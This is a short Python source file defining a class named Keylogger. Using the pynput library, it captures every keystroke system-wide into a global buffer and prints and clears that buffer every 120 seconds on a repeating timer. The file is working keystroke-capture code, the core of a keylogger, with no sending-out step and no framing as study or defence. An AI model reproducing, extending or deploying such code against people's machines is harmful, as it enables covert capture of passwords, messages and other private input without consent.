import pynput.keyboard as pynput
import threading
newKey = ''
class Keylogger:
    def newfunction(self,key):
        global newKey
        try:
            newKey = newKey + str(key.char)
        except AttributeError:
            if key == key.space:
                newKey = newKey + " "
            else: 
                newKey = newKey + " " + str(key) 

    def NewFun(self):
        global newKey
        print(newKey)
        newKey = ""
        Timer = threading.Timer(120, self.NewFun)
        Timer.start()
    def start(self):
        Zir = pynput.Listener(on_press = self.newfunction)
        with Zir:
            self.NewFun()
            Zir.join()

